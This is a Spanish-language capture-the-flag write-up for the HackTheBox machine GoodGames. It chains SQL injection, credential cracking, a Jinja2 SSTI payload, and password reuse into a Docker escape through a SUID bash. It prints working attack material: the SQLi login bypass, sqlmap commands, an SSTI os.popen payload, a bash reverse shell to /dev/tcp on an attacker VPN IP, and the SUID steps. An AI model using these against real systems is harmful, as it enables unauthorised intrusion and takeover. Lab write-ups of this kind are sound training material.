---
layout: post
render_with_liquid: false
permalink: /writeups/goodgames/
title: "HTB Writeup: GoodGames"
date: 2026-01-24
category: writeups
tags: [htb, linux, easy, sqli, ssti, docker, flask, jinja2]
platform: HackTheBox
os: Linux
difficulty: Easy
resumen: "SQL Injection para bypass de login y dump de credenciales. SSTI en panel Flask para RCE. Escalada escapando del contenedor Docker vía volumen compartido."
---


| Propiedad    | Valor             |
| :----------- | :---------------- |
| Plataforma   | HackTheBox        |
| OS           | Linux             |
| Dificultad   | Easy              |
| Autor        | TheCyberGeek      |

## Sinopsis

Máquina Linux de dificultad fácil que pone de manifiesto la importancia de sanear las entradas del usuario en aplicaciones web. El camino de explotación incluye **Inyección SQL** para extraer credenciales, **reutilización de contraseñas**, **Server-Side Template Injection (SSTI)** en una aplicación Flask para obtener ejecución remota de comandos, y finalmente una **escalada de privilegios mediante escape de contenedor Docker** aprovechando un volumen montado compartido.

---

## Reconocimiento

### Escaneo de puertos

Comenzamos con un escaneo de puertos completo de la máquina víctima:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.118.8 -oG allPorts
```

| Parámetro          | Descripción                                                |
| ------------------ | ---------------------------------------------------------- |
| `-p-`              | Escanea todos los puertos (1-65535)                        |
| `--open`           | Muestra únicamente los puertos abiertos                    |
| `-sS`              | Escaneo SYN (sigiloso), corta la conexión con un RST       |
| `--min-rate 5000`  | Envía al menos 5000 paquetes por segundo (rapidez)         |
| `-vvv`             | Máxima verbosidad                                          |
| `-n`               | No resolución DNS                                          |
| `-Pn`              | No realiza descubrimiento de host (asume que está activo)   |
| `-oG allPorts`     | Exporta en formato grepeable                               |

![Escaneo de puertos con nmap](/writeups/goodgames/assets/01_nmap_all_ports.png)

La máquina víctima solo cuenta con el **puerto 80** (HTTP) abierto.

### Detección de versiones y scripts

Lanzamos un conjunto de scripts de reconocimiento de `nmap` contra el puerto abierto para detectar versiones de servicio y posibles vulnerabilidades:

![Scripts de reconocimiento nmap](/writeups/goodgames/assets/02_nmap_scripts.png)

El servicio web corre sobre **Werkzeug/2.0.2 Python/3.9.2**, lo que nos indica que es una aplicación **Python** (Flask/Django).

### Tecnologías web

Identificamos las tecnologías que utiliza el sitio web:

![Tecnologías del sitio web](/writeups/goodgames/assets/03_web_technologies.png)

![Página principal de GoodGames](/writeups/goodgames/assets/04_web_homepage.png)

El sitio es un portal de videojuegos y tienda online. En el footer de la página se revela el dominio `goodgames.htb`, que debemos añadir a nuestro archivo `/etc/hosts`:

```bash
echo "10.129.118.8 goodgames.htb" | sudo tee -a /etc/hosts
```

### Fuzzing de directorios

Procedemos a hacer *fuzzing* con **Gobuster** para descubrir directorios o archivos ocultos:

![Fuzzing con Gobuster](/writeups/goodgames/assets/05_gobuster_fuzzing.png)

Todas las rutas devuelven el mismo código de estado. Esto se debe a que el backend utiliza un **catch-all** (comportamiento típico en aplicaciones SPA o frameworks web que redirigen todas las rutas).

![Resultados de Gobuster](/writeups/goodgames/assets/06_gobuster_results.png)

No encontramos nada que no sea accesible desde la propia web.

---

## Explotación

### SQL Injection — Bypass de login

En el panel de login de la web probamos a bypassear la autenticación mediante una **Inyección SQL**. Utilizamos el siguiente payload en el campo de email:

```
admin' or 1=1 --
```

> **Nota:** Es recomendable usar **BurpSuite** para enviar la petición directamente, ya que el formulario puede tener validaciones del lado del cliente que impidan introducir el payload.

![Bypass de login con SQLi](/writeups/goodgames/assets/07_sqli_bypass_login.png)

![Login exitoso con SQLi](/writeups/goodgames/assets/08_sqli_login_success.png)

Cuando aparece **LOGIN SUCCESS** sabemos que la consulta SQL se cumple, confirmando que la aplicación es vulnerable a SQLi.

### Identificación del motor de base de datos

Identificamos el motor de la base de datos. Al no necesitar referenciar la tabla `dual` (requerida en Oracle), confirmamos que se trata de **MySQL**:

![Identificación de MySQL](/writeups/goodgames/assets/09_sqli_mysql_identification.png)

### Extracción de datos mediante SQLi

Tenemos la capacidad de autenticarnos mediante un bypass de login. Si concatenamos otra consulta verdadera entramos, y si es falsa da error. Aprovechamos este comportamiento de tipo **Blind SQLi** basado en booleanos para exfiltrar datos.

Podemos hacer fuerza bruta carácter a carácter usando `SUBSTR()` para ir descubriendo los nombres de las bases de datos:

![Fuerza bruta del nombre de BD](/writeups/goodgames/assets/10_sqli_bruteforce_dbname.png)

#### Bases de datos

![Nombres de bases de datos](/writeups/goodgames/assets/11_sqli_database_names.png)

#### Tablas

![Nombres de tablas](/writeups/goodgames/assets/12_sqli_table_names.png)

![Tabla user](/writeups/goodgames/assets/13_sqli_table_user.png)

#### Columnas

![Columnas de la tabla user](/writeups/goodgames/assets/14_sqli_columns.png)

#### Credenciales

Continuamos extrayendo los valores de las columnas hasta obtener la contraseña del administrador. El hash obtenido tiene **32 caracteres**, lo que nos indica que se trata de un hash **MD5**:

| Campo    | Valor                                |
| -------- | ------------------------------------ |
| Usuario  | `admin`                              |
| Email    | `admin@goodgames.htb`                |
| Hash MD5 | `2b22337f218b2d82dfc3b6f77e7cb8ec`   |

Desciframos el hash con **hashcat** o una herramienta como [CrackStation](https://crackstation.net/):

```
superadministrator
```

> **Tip:** También se puede automatizar la extracción con **SQLMap** guardando la petición de login interceptada:
> ```bash
> sqlmap -r goodgames.req --dbs
> sqlmap -r goodgames.req -D main --tables
> sqlmap -r goodgames.req -D main -T user --dump
> ```

### Acceso como administrador

Nos logueamos en la web con las credenciales `admin@goodgames.htb : superadministrator`.

Una vez dentro, aparece un **icono de engranaje** que nos redirige a `http://internal-administration.goodgames.htb`, un subdominio que el navegador no puede resolver. Añadimos el dominio al `/etc/hosts`:

```bash
# En /etc/hosts
10.129.9.111    goodgames.htb internal-administration.goodgames.htb
```

![Configuración del archivo hosts](/writeups/goodgames/assets/15_hosts_file.png)

![Panel de administración interno](/writeups/goodgames/assets/16_internal_admin_panel.png)

### Panel de administración interno — Flask Volt

Nos aparece un nuevo panel de autenticación. Probamos a **reutilizar las credenciales** del administrador:

- **Usuario:** `admin`
- **Contraseña:** `superadministrator`

![Credenciales de administrador](/writeups/goodgames/assets/17_admin_credentials.png)

![Panel Flask Volt](/writeups/goodgames/assets/18_flask_volt_panel.png)

Entramos con éxito. El panel interno es **Flask Volt**, lo que confirma que la aplicación está construida con **Flask** (Python).

![Framework Flask](/writeups/goodgames/assets/19_flask_framework.png)

> **Importante:** El hecho de que sea una aplicación Flask nos abre la puerta a posibles vulnerabilidades de **Server-Side Template Injection (SSTI)**, ya que Flask utiliza el motor de plantillas **Jinja2**.

---

## SSTI — Server-Side Template Injection

### Detección

En el panel de administración encontramos una funcionalidad para **cambiar el nombre del perfil**. Como la web utiliza Flask (Jinja2), probamos si es vulnerable a SSTI introduciendo una expresión matemática como valor del nombre:

```jinja2
{{7*7}}
```

![Detección de SSTI](/writeups/goodgames/assets/20_ssti_detection.png)

Si la web muestra **49** en lugar de `{{7*7}}`, significa que está **interpretando la expresión**, confirmando la vulnerabilidad SSTI.

### Reverse Shell mediante SSTI (RCE)

Ahora que tenemos SSTI confirmado, lo aprovechamos para conseguir **ejecución remota de comandos (RCE)** y obtener una reverse shell.

**Paso 1:** Generamos el payload de la reverse shell en Base64 para evitar problemas con caracteres especiales:

```bash
echo -n 'bash -i >& /dev/tcp/TU_IP_VPN/4444 0>&1' | base64
```

**Paso 2:** Construimos el payload SSTI completo. Para mayor comodidad, usamos **BurpSuite** para enviar la petición:

```jinja2
{{ request.application.__globals__.__builtins__.__import__('os').popen('echo PAYLOAD_EN_BASE64 | base64 -d | bash').read() }}
```

> **Tip:** Selecciona todo el payload y pulsa `Ctrl + U` en BurpSuite para **URL-encodearlo** automáticamente y evitar problemas de interpretación.

![Payload SSTI en BurpSuite](/writeups/goodgames/assets/21_ssti_payload_burp.png)

![Payload SSTI codificado](/writeups/goodgames/assets/22_ssti_payload_encoded.png)

![Respuesta del servidor](/writeups/goodgames/assets/23_ssti_response.png)

**Paso 3:** Nos ponemos en escucha con **netcat** en el puerto definido en el payload:

```bash
nc -nlvp 4444
```

![Reverse shell obtenida](/writeups/goodgames/assets/24_reverse_shell.png)

¡Obtenemos una shell como **root** dentro de un contenedor Docker! (`root@3a453ab39d3d`)

### Tratamiento de la TTY

Para operar correctamente, realizamos el tratamiento de la TTY:

```bash
script /dev/null -c bash
# Ctrl + Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
stty rows 38 columns 184
```

![Tratamiento de la TTY](/writeups/goodgames/assets/25_tty_treatment.png)

---

## Escalada de privilegios — Docker Breakout

### Reconocimiento del entorno

Al revisar el entorno nos damos cuenta de que estamos dentro de un **contenedor Docker**:

```bash
hostname
# 3a453ab39d3d (hash típico de contenedores Docker)
```

![Contenedor Docker](/writeups/goodgames/assets/26_docker_container.png)

En el directorio `/home` encontramos el usuario **augustus**, cuyos archivos pertenecen al **UID 1000** (un usuario del host, no del contenedor).

### Escaneo de puertos del host

Necesitamos identificar la IP del host. En redes Docker, el host suele tener la primera IP de la subred del contenedor, típicamente `172.19.0.1`. Realizamos un escaneo rápido de puertos:

```bash
for PORT in {1..1000}; do timeout 1 bash -c "</dev/tcp/172.19.0.1/$PORT" &>/dev/null && echo "Puerto $PORT ABIERTO"; done
```

![Escaneo de puertos del host](/writeups/goodgames/assets/27_port_scan_host.png)

Encontramos los puertos **22 (SSH)** y **80 (HTTP)** abiertos en el host.

### Acceso al host por SSH

Podemos intuir que el usuario **augustus** es el dueño del contenedor y, por lo tanto, del host. Probamos a conectarnos por SSH reutilizando la contraseña:

```bash
ssh augustus@172.19.0.1
# Contraseña: superadministrator
```

![SSH como augustus](/writeups/goodgames/assets/28_ssh_augustus.png)

Efectivamente, **reutilizó la contraseña**. Estamos dentro del host como `augustus`.

📌 **User flag:** `/home/augustus/user.txt`

### Escalada a root — Abuso de volumen Docker compartido

Observamos que el directorio `/home/augustus` en el host es **la misma carpeta montada** en el contenedor Docker. Esto significa que:

- En el **contenedor** tenemos permisos de **root**.
- En el **host**, `augustus` puede acceder a su directorio home.
- Los cambios realizados desde el contenedor se reflejan en el host.

Aprovechamos esto para crear un binario de **bash con SUID de root**:

**Desde el contenedor (como root):**

```bash
# 1. Copiar el binario bash al directorio compartido
cp /bin/bash /home/augustus/bash

# 2. Cambiar el propietario a root
chown root:root /home/augustus/bash

# 3. Asignar el bit SUID
chmod +s /home/augustus/bash
```

**Desde el host (como augustus):**

```bash
# 4. Ejecutar la bash con privilegios preservados
./bash -p
```

![Escalada a root](/writeups/goodgames/assets/29_escalation_root.png)

¡Somos **root** en la máquina real GoodGames! 🎉

📌 **Root flag:** `/root/root.txt`

---

## Resumen del ataque

```
Reconocimiento → SQLi Bypass Login → Extracción de credenciales (MD5)
→ Acceso al panel interno Flask → SSTI/RCE → Shell en Docker (root)
→ Pivoting SSH como augustus → Docker Breakout (bash SUID) → Root
```
